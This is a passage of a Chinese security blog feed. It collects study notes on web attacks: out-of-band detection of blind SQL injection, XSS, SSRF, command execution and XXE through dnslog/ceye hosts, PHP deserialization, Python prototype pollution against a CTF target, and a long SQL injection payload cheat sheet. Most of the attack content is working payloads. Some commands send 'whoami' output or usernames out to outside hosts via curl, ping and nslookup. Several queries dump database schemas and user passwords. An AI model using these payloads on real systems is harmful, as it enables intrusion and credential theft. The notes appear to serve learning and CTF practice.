class="hljs-string">&#x27;.mysql.buvx2r.ceye.io\\abc&#x27;</span>)),<span class="hljs-number">2</span>,<span class="hljs-number">3</span><span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240515001429.png"></p><p><img src="/images/Pasted%20image%2020240515001436.png"></p><p><img src="/images/Pasted%20image%2020240515001443.png"></p><p>解密。。。</p><h1 id="4、XSS-无回显"><a href="#4、XSS-无回显" class="headerlink" title="4、XSS 无回显"></a>4、XSS 无回显</h1><p>通过盲打，让触发者浏览器访问预设至的链接地址。如果盲打成功，平台会收到链接访问记录。</p><p>payload: <code>&gt;&lt;img src=http://xss.xxxx.ceye.io/aaa&gt;</code> 让src请求我们的dnslog平台</p><p><img src="/images/Pasted%20image%2020240515001456.png"></p><h1 id="5、SSRF-无回显"><a href="#5、SSRF-无回显" class="headerlink" title="5、SSRF 无回显"></a>5、SSRF 无回显</h1><p>payload：</p><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs delphi">/uddiexplorer/SearchPublicRegistries.jsp?rdoSearch=<span class="hljs-keyword">name</span>&amp;txtSearchname=sdf&amp;txtSearchkey=&amp;txtSearchfor=&amp;selfor=Business+location&amp;btnSubmit=Search&amp;<span class="hljs-keyword">operator</span>=http:<span class="hljs-comment">//rsr8pf.dnslog.cn</span><br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240515001550.png"></p><h1 id="6、命令执行-无回显"><a href="#6、命令执行-无回显" class="headerlink" title="6、命令执行 无回显"></a>6、命令执行 无回显</h1><p>当 ping 一个域名时会对其进行一个递归 DNS 查询的过程，这个时候就能在后端获取到 DNS 的查询请求，当命令真正被执行且平台收到回显时就说明漏洞存在。</p><p>linux：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">curl http://haha.xxx.ceye.io/`<span class="hljs-built_in">whoami</span>`<br>ping `<span class="hljs-built_in">whoami</span>`.xxxx.ceye.io<br></code></pre></td></tr></table></figure><p>Windows：</p><figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs plaintext">ping %USERNAME%.xxx.ceye.io<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240515001604.png"></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs bash">cmd /v /c <span class="hljs-string">&quot;whoami &gt; temp &amp;&amp; certutil -encode temp temp2 &amp;&amp; findstr /L /V &quot;</span>CERTIFICATE<span class="hljs-string">&quot; temp2 &gt; temp3 &amp;&amp; set /p MYVAR=&lt; temp3 &amp;&amp; set FINAL=!MYVAR!.xxx.ceye.io &amp;&amp; nslookup !FINAL!&quot;</span><br>del temp*<br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240515001612.png"></p><h1 id="7、XXE-无回显"><a href="#7、XXE-无回显" class="headerlink" title="7、XXE 无回显"></a>7、XXE 无回显</h1><p>payload：</p><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">root</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY % <span class="hljs-keyword">remote</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://ip.port.b182oj.ceye.io/xxe_test&quot;</span>&gt;</span></span><br><span class="hljs-meta">%remote;]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">root</span>/&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight xml"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs xml"><span class="hljs-meta">&lt;?xml version=<span class="hljs-string">&quot;1.0&quot;</span> encoding=<span class="hljs-string">&quot;UTF-8&quot;</span>?&gt;</span><br><span class="hljs-meta">&lt;!DOCTYPE <span class="hljs-keyword">ANY</span> [</span><br><span class="hljs-meta"><span class="hljs-meta">&lt;!ENTITY <span class="hljs-keyword">xxe</span> <span class="hljs-keyword">SYSTEM</span> <span class="hljs-string">&quot;http://zhwzti.dnslog.cn&quot;</span> &gt;</span></span><br><span class="hljs-meta">]&gt;</span><br><span class="hljs-tag">&lt;<span class="hljs-name">value</span>&gt;</span><span class="hljs-symbol">&amp;xxe;</span><span class="hljs-tag">&lt;/<span class="hljs-name">value</span>&gt;</span><br></code></pre></td></tr></table></figure><p><img src="/images/Pasted%20image%2020240515001618.png"></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-php%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-php%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p><a href="https://www.cnblogs.com/fish-pompom/p/11126473.html">PHP反序列化从初级到高级利用篇 - fish_pompom - 博客园 (cnblogs.com)</a></p><h3 id="序列化"><a href="#序列化" class="headerlink" title="序列化"></a>序列化</h3><p>序列化说通俗点就是把一个对象变成可以传输的字符串,比如下面是一个对象:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>        <span class="hljs-keyword">public</span> <span class="hljs-variable">$test</span>=<span class="hljs-string">&quot;pikachu&quot;</span>;<br>    &#125;<br>    <span class="hljs-variable">$s</span>=<span class="hljs-keyword">new</span> <span class="hljs-title function_ invoke__">S</span>(); <span class="hljs-comment">//创建一个对象</span><br>    <span class="hljs-title function_ invoke__">serialize</span>(<span class="hljs-variable">$s</span>); <span class="hljs-comment">//把这个对象进行序列化</span><br></code></pre></td></tr></table></figure><p>序列化后得到的结果是这个样子的:O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}<br>        O:代表object<br>        1:代表对象名字长度为一个字符<br>        S:对象的名称<br>        1:代表对象里面有一个变量<br>        s:数据类型<br>        4:变量名称的长度<br>        test:变量名称<br>        s:数据类型<br>        7:变量值的长度<br>        pikachu:变量值</p><p><img src="/images/Pasted%20image%2020240305232536.png"></p><h3 id="反序列化"><a href="#反序列化" class="headerlink" title="反序列化"></a>反序列化</h3><p>就是把被序列化的字符串还原为对象,然后在接下来的代码中继续使用。<br>&#96;$u&#x3D;unserialize(“O:1:”S”:1:{s:4:”test”;s:7:”pikachu”;}”);<br>  &#96;&#96;  echo $u-&gt;test; &#x2F;&#x2F;得到的结果为pikachu<br>序列化和反序列化本身没有问题,但是如果反序列化的内容是用户可以控制的,且后台不正当的使用了PHP中的魔法函数,就会导致安全问题</p><p>常见的几个魔法函数:</p><figure class="highlight scss"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs scss"><span class="hljs-built_in">__construct</span>()当一个对象创建时被调用<br><span class="hljs-built_in">__destruct</span>()当一个对象销毁时被调用<br><span class="hljs-built_in">__toString</span>()当一个对象被当作一个字符串使用<br><span class="hljs-built_in">__sleep</span>() 在对象在被序列化之前运行<br>__wakeup将在序列化之后立即被调用<br></code></pre></td></tr></table></figure><p>漏洞举例:</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-class"><span class="hljs-keyword">class</span> <span class="hljs-title">S</span></span>&#123;<br>            <span class="hljs-keyword">var</span> <span class="hljs-variable">$test</span> = <span class="hljs-string">&quot;pikachu&quot;</span>;<br>            <span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">__destruct</span>(<span class="hljs-params"></span>)</span>&#123;<br>                <span class="hljs-keyword">echo</span> <span class="hljs-variable language_">$this</span>-&gt;test;<br>            &#125;<br>        &#125;<br>        <span class="hljs-variable">$s</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;test&#x27;</span>];<br>        @<span class="hljs-variable">$unser</span> = <span class="hljs-title function_ invoke__">unserialize</span>(<span class="hljs-variable">$a</span>);<br></code></pre></td></tr></table></figure><p>payload:<code>O:1:&quot;S&quot;:1:&#123;s:4:&quot;test&quot;;s:29:&quot;&lt;script&gt;alert(&#39;xss&#39;)&lt;/script&gt;&quot;;&#125;</code></p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-python%E5%8E%9F%E5%9E%8B%E9%93%BE%E6%B1%A1%E6%9F%93/</url>
    
    <content type="html"><![CDATA[<p><a href="https://xz.aliyun.com/t/13072?time__1311=GqmhBKwKGNDKKYIe0IqY5+u11D8DIrbD">浅谈Python原型链污染及利用方式 - 先知社区 (aliyun.com)</a></p><p><a href="https://www.cnblogs.com/Article-kelp/p/17068716.html">Python原型链污染变体(prototype-pollution-in-python) - Article_kelp - 博客园 (cnblogs.com)</a></p><p>一般来说要发送json格式的数据, 可以使用python脚本发</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> requests<br><span class="hljs-keyword">import</span> json<br>brup_proxy = &#123;<span class="hljs-string">&#x27;http&#x27;</span>:<span class="hljs-string">&quot;127.0.0.1:9090&quot;</span>&#125;<br><span class="hljs-comment"># 要发送的数据</span><br>data = &#123;<br>    <span class="hljs-string">&quot;__init__&quot;</span>: &#123;<br>        <span class="hljs-string">&quot;__globals__&quot;</span>: &#123;<br>            <span class="hljs-string">&quot;BLACKLIST_IN_index&quot;</span>:<span class="hljs-string">&quot;&quot;</span><br>        &#125;<br>    &#125;<br>&#125;<br><br><span class="hljs-comment"># 目标URL</span><br>url = <span class="hljs-string">&#x27;http://challenge.basectf.fun:35430/magic&#x27;</span><br><span class="hljs-comment"># 发送POST请求</span><br>response = requests.post(url, json=data,proxies=brup_proxy)<br><span class="hljs-built_in">print</span>(response.text)<br></code></pre></td></tr></table></figure><p>转化为http报文</p><figure class="highlight http"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><code class="hljs http"><span class="hljs-keyword">POST</span> <span class="hljs-string">/magic</span> <span class="hljs-meta">HTTP/1.1</span><br><span class="hljs-attribute">Host</span><span class="hljs-punctuation">: </span>challenge.basectf.fun:35430<br><span class="hljs-attribute">User-Agent</span><span class="hljs-punctuation">: </span>python-requests/2.22.0<br><span class="hljs-attribute">Accept-Encoding</span><span class="hljs-punctuation">: </span>gzip, deflate<br><span class="hljs-attribute">Accept</span><span class="hljs-punctuation">: </span>*/*<br><span class="hljs-attribute">Connection</span><span class="hljs-punctuation">: </span>close<br><span class="hljs-attribute">Content-Length</span><span class="hljs-punctuation">: </span>57<br><span class="hljs-attribute">Content-Type</span><span class="hljs-punctuation">: </span>application/json<br><br><span class="language-json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__init__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;__globals__&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;BLACKLIST_IN_index&quot;</span><span class="hljs-punctuation">:</span> <span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span><span class="hljs-punctuation">&#125;</span></span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-RCE/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-RCE/</url>
    
    <content type="html"><![CDATA[<p>shell_exec()    执行系统命令<br>eval()   执行php代码</p><p>eval(“system(“ls”)”)     套了一层, 还是输出了ls命令</p>]]></content>
    
    
    
  </entry>
  
  
  
  <entry>
    <title></title>
    <link href="/2024/09/23/%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/"/>
    <url>/2024/09/23/%E6%BC%8F%E6%B4%9E-SQL%E6%B3%A8%E5%85%A5/</url>
    
    <content type="html"><![CDATA[<p>  <a href="https://www.freebuf.com/articles/web/339118.html">浅谈Sql注入总结笔记整理(超详细) - FreeBuf网络安全行业门户</a><br>  <a href="https://forum.butian.net/share/2768">https://forum.butian.net/share/2768</a></p><h2 id="分类"><a href="#分类" class="headerlink" title="分类"></a>分类</h2><ul><li>有回显<ul><li>联合查询注入 –&gt; union</li><li>报错注入 –&gt; 构成报错语句</li><li>堆查询 –&gt; 多行语句执行</li></ul></li><li>无回显<ul><li>布尔盲注 –&gt; 回显不同</li><li>时间盲注 –&gt; 响应时间不同</li></ul></li></ul><h2 id="联合查询注入"><a href="#联合查询注入" class="headerlink" title="联合查询注入"></a>联合查询注入</h2><p>前提：知道列数且页面上有显示位。<br>判断显示位、获取所有数据库名、获取指定数据库所有表名、获取指定数据库指定表中所有字段名、获取具体数据。</p><p>列数<br><code>select id,username,password from security.users where id=1 order by 1;</code><br>显示位<br><code>select id,username,password from security.users where id=1 union select 1,2,3;</code></p><p>数据库名</p><h3 id="关于将id值设置为0或者负数的解释"><a href="#关于将id值设置为0或者负数的解释" class="headerlink" title="关于将id值设置为0或者负数的解释"></a>关于将id值设置为0或者负数的解释</h3><p>由于我们的语句是插入到原有语句后面，这样就会出现两个SQL语句同时执行，由于SQL查询会默认返回一行数据，所以我们插入的第二行语句的结果就不会被返回，只会返回原有的SQL语句的查询内容。<br>要让数据库查询我们插入的语句，需要让原有SQL语句产生查询错误，注意：查询错误不是语法错误，查询错误只会返回空，不会让语句报错。<br>所以我们可以使id&#x3D;0或id&#x3D;-1，零或负数不会被用作id值，它插入进去一定导致原有SQL语句查询结果为空，我们插入的SQL语句的结果就会被返回。<br>联合查询时union select无法执行时 用union+select代替 接下来的查询语句空格全部用 <code>+</code> 代替<br><code>?id=-1&#39; union select 1,2,database() --+</code></p><h3 id="查询所有数据库名"><a href="#查询所有数据库名" class="headerlink" title="查询所有数据库名"></a>查询所有数据库名</h3><p><code>?id=-1&#39; union select 1,2,group_concat(schema_name) from information_schema.schemata --+</code></p><h3 id="查询数据库中表名"><a href="#查询数据库中表名" class="headerlink" title="查询数据库中表名"></a>查询数据库中表名</h3><p><code>?id=-1&#39; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=database() --+</code></p><p>或</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">?id=<span class="hljs-number">-1</span><span class="hljs-string">&#x27; union select 1,2,group_concat(table_name) from information_schema.tables where table_schema=&#x27;</span><span class="hljs-keyword">security</span><span class="hljs-string">&#x27; --+</span><br><span class="hljs-string">#指定数据库中指定表中所有字段名</span><br><span class="hljs-string">?id=-1&#x27;</span> <span class="hljs-keyword">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,group_concat(<span class="hljs-built_in">column_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">columns</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-string">&#x27;security&#x27;</span> <span class="hljs-keyword">and</span> <span class="hljs-built_in">table_name</span>=<span class="hljs-string">&#x27;users&#x27;</span> <span class="hljs-comment">--+</span><br></code></pre></td></tr></table></figure><p>具体数据<br><code>?id=-1&#39; union select 1,2,group_concat(username,password) from users --+</code></p><h3 id="group-concat"><a href="#group-concat" class="headerlink" title="group_concat()"></a>group_concat()</h3><p>将多条查询语句拼接在一起<br>应用情况: 网站只返回一条信息</p><ul><li>注</li><li>concat()是针对以行数据做的拼接，而group_concat()是针对列做的数据拼接</li></ul><h2 id="报错注入"><a href="#报错注入" class="headerlink" title="报错注入"></a>报错注入</h2><p>报错注入在没法用union联合查询时用，但前提还是不能过滤一些关键的函数。<br>报错注入就是利用了数据库的某些机制，人为地制造错误条件，使得查询结果能够出现在错误信息中。这里主要记录一下<code>xpath语法错误</code>和<code>concat+rand()+group_by()导致主键重复</code>  </p><h3 id="xpath语法错误"><a href="#xpath语法错误" class="headerlink" title="xpath语法错误"></a>xpath语法错误</h3><p>利用xpath语法错误来进行报错注入主要利用<code>extractvalue</code>和<code>updatexml</code>两个函数。<br>使用条件：mysql版本&gt;5.1.5  </p><h4 id="extractvalue"><a href="#extractvalue" class="headerlink" title="extractvalue()"></a>extractvalue()</h4><blockquote><p>函数原型：<code>extractvalue(xml_document,Xpath_string)    正常语法：</code>extractvalue(xml_document,Xpath_string);<br> 第一个参数：<code>xml_document</code>是string格式，为xml文档对象的名称<br> 第二个参数：<code>Xpath_string</code>是xpath格式的字符串<br> 作用：从目标xml中返回包含所查询值的字符串</p></blockquote><p>第二个参数是要求符合xpath语法的字符串，如果不满足要求，则会报错，并且将查询结果放在报错信息里，因此可以利用。</p><p>payload：<code>id=&#39;and(select extractvalue(&quot;anything&quot;,concat(&#39;~&#39;,(select语句))))</code></p><p>例如：</p><pre><code class="hljs">id=&#39;and(select extractvalue(1,concat(&#39;~&#39;,(select database()))))id=&#39;and(select extractvalue(1,concat(0x7e,@@version)))</code></pre><p>针对mysql数据库：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">查数据库名：id=<span class="hljs-string">&#x27;and(select extractvalue(1,concat(0x7e,(select database()))))</span><br><span class="hljs-string">爆表名：id=&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>) <span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>()))))<br>爆字段名：id=<span class="hljs-string">&#x27;and(select extractvalue(1,concat(0x7e,(select group_concat(column_name) from information_schema.columns where table_name=&quot;TABLE_NAME&quot;))))</span><br><span class="hljs-string">爆数据：id=&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> extractvalue(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(COIUMN_NAME) <span class="hljs-keyword">from</span> <span class="hljs-built_in">TABLE_NAME</span>))))<br></code></pre></td></tr></table></figure><p>注：</p><ul><li>① 0x7e&#x3D;’~’</li><li>② concat(‘a’,‘b’)&#x3D;“ab”</li><li>③ version()&#x3D;@@version</li><li>④ ‘~‘可以换成’#’、’$’等不满足xpath格式的字符</li><li>⑤ extractvalue()能查询字符串的最大长度为32，如果我们想要的结果超过32，就要用substring()函数截取或limit分页，一次查看最多32位</li></ul><h4 id="updatexml"><a href="#updatexml" class="headerlink" title="updatexml()"></a>updatexml()</h4><p>updatexml()是一个使用不同的xml标记匹配和替换xml块的函数。<br>作用：改变文档中符合条件的节点的值</p><blockquote><p>函数原型：updatexml(xml_document,xpath_string,new_value)<br> 正常语法：updatexml(xml_document,xpath_string,new_value)<br> 第一个参数：xml_document是string格式，为xml文档对象的名称<br> 第二个参数：xpath_string是xpath格式的字符串<br> 第三个参数：new_value是string格式，替换查找到的负荷条件的数据 作用：改变文档中符合条件的节点的值<br> 所以第一和第三个参数可以随便写，只需要利用第二个参数，他会校验你输入的内容是否符合XPATH格式</p></blockquote><ul><li>updatexml使用时，当xpath_string格式出现错误，mysql则会爆出xpath语法错误（xpath syntax）</li><li>例如： select * from test where ide &#x3D; 1 and (updatexml(1,0x7e,3)); 由于0x7e是~，不属于xpath语法格式，因此报出xpath语法错误。</li></ul><p>第二个参数跟extractvalue函数的第二个参数一样，因此也可以利用，且利用方式相同<br>payload：<code>id=&#39;and(selectupdatexml(&quot;anything&quot;,concat(&#39;~&#39;,(select语句())),&quot;anything&quot;))</code></p><p>例如：</p><pre><code class="hljs">&#39;and(select updatexml(1,concat(&#39;~&#39;,(select database())),1))&#39;and(select updatexml(1,concat(0x7e,@@database),1))</code></pre><p>同样，针对mysql：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">爆数据库名：<span class="hljs-string">&#x27;and(select updatexml(1,concat(0x7e,(select database())),0x7e))</span><br><span class="hljs-string">    爆表名：&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">table_name</span>)<span class="hljs-keyword">from</span> information_schema.<span class="hljs-keyword">tables</span> <span class="hljs-keyword">where</span> table_schema=<span class="hljs-keyword">database</span>())),<span class="hljs-number">0x7e</span>))<br>    爆列名：<span class="hljs-string">&#x27;and(select updatexml(1,concat(0x7e,(select group_concat(column_name)from information_schema.columns where table_name=&quot;TABLE_NAME&quot;)),0x7e))</span><br><span class="hljs-string">    爆数据：&#x27;</span><span class="hljs-keyword">and</span>(<span class="hljs-keyword">select</span> updatexml(<span class="hljs-number">1</span>,concat(<span class="hljs-number">0x7e</span>,(<span class="hljs-keyword">select</span> group_concat(<span class="hljs-built_in">COLUMN_NAME</span>)<span class="hljs-keyword">from</span> <span class="hljs-built_in">TABLE_NAME</span>)),<span class="hljs-number">0x7e</span>))<br></code></pre></td></tr></table></figure><h3 id="concat-rand-group-by-导致主键重复"><a href="#concat-rand-group-by-导致主键重复" class="headerlink" title="concat+rand()+group_by()导致主键重复"></a>concat+rand()+group_by()导致主键重复</h3><p>这种报错方法的本质是因为<code>floor(rand(0)*2)</code>的重复性，导致group by语句出错。<br><code>group by key</code>的原理是循环读取数据的每一行，将结果保存于临时表中。读取每一行的key时，如果key存在于临时表中，则不在临时表中更新临时表的数据；如果key不在临时表中，则在临时表中插入key所在行的数据。</p><p><strong>rand()：</strong></p><blockquote><p>生成0~1之间的随机数，可以给定一个随机数的种子，对于每一个给定的种子，rand()函数都会产生一系列可以复现的数字</p></blockquote><p><strong>floor()：</strong></p><blockquote><p>对任意正或者负的十进制值向下取整</p></blockquote><p>通常利用这两个函数的方法是<code>floor(rand(0))*2</code> ,其会生成0和1两个数</p><p><strong>group by</strong></p><blockquote><p>group by是根据一个或多个列对结果集进行分组的sql语句，其用法为：<br> SELECT column_name, aggregate_function(column_name)<br> FROM table_name<br> WHERE column_name operator value<br> GROUP BY column_name</p></blockquote><p>常见的payload为：<br><code>&#39;union select 1 from (select count(*),concat((slelect语句),floor(rand(0)*2))x from &quot;一个足大的表&quot; group by x)a--+ 例如： </code>‘union select 1 from (select count(*),concat((select user()),floor(rand(0)*2))x from information_schema.tables group by x)a–+<br>&#96;利用information_schema.tables表，相似的还可以用information_schema.columns等</p><p>为了使结构能够更方便的查看，可以在concat()中添加一些内容<br>&#96;’union select 1 from (select count(*),concat((select user()),” “,floor(rand(0)*2))x from information_schema.tables group by x)a</p><p>之后还是将select语句改为一般的注入语句就可以：</p><figure class="highlight q"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs q">爆数据库名：&#x27;<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> database()),<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a<br>爆表名：&#x27;<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> table_name <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">where</span> table_schema=database() limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a<br>爆列名：&#x27;<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> column_name <span class="hljs-keyword">from</span> information_schema.columns <span class="hljs-built_in">where</span> table_name=<span class="hljs-string">&quot;TABLE_NAME&quot;</span> limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a<br>爆数据：&#x27;<span class="hljs-built_in">union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span> <span class="hljs-keyword">from</span> (<span class="hljs-keyword">select</span> <span class="hljs-built_in">count</span>(*),concat((<span class="hljs-keyword">select</span> COLUMN_NAME <span class="hljs-keyword">from</span> TABLE_NAME limit <span class="hljs-number">0</span>,<span class="hljs-number">1</span>) ,<span class="hljs-string">&quot; &quot;</span>,<span class="hljs-built_in">floor</span>(<span class="hljs-built_in">rand</span>(<span class="hljs-number">0</span>)*<span class="hljs-number">2</span>))x <span class="hljs-keyword">from</span> information_schema.<span class="hljs-built_in">tables</span> <span class="hljs-built_in">group</span> <span class="hljs-keyword">by</span> x)a<br></code></pre></td></tr></table></figure><p>不能使用group_concat函数，所以用limit语句来限制查询结果的列数</p><h2 id="堆查询"><a href="#堆查询" class="headerlink" title="堆查询"></a>堆查询</h2><h2 id="布尔盲注"><a href="#布尔盲注" class="headerlink" title="布尔盲注"></a>布尔盲注</h2><p>布尔状态例如<br>1.回显不同 (内容、长度)<br>2.HTTP响应状态码不同 (200、500)<br>3.HTTP响应头变化(无条件重定向、设置cookie<br>4.基于错误的布尔注入 (MySOL是否报错)</p><h3 id="布尔盲注的基本问题"><a href="#布尔盲注的基本问题" class="headerlink" title="布尔盲注的基本问题"></a>布尔盲注的基本问题</h3><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs SQL"><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;a&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是a<br><span class="hljs-keyword">select</span> <span class="hljs-operator">*</span> <span class="hljs-keyword">from</span> users <span class="hljs-keyword">where</span> id <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;1&#x27;</span> <span class="hljs-keyword">and</span> substr((<span class="hljs-keyword">select</span> database()),<span class="hljs-number">1</span>,<span class="hljs-number">1</span>) <span class="hljs-operator">=</span> <span class="hljs-string">&#x27;b&#x27;</span> #查看database的第<span class="hljs-number">1</span>位字符是不是b<br><span class="hljs-keyword">select</span> <span 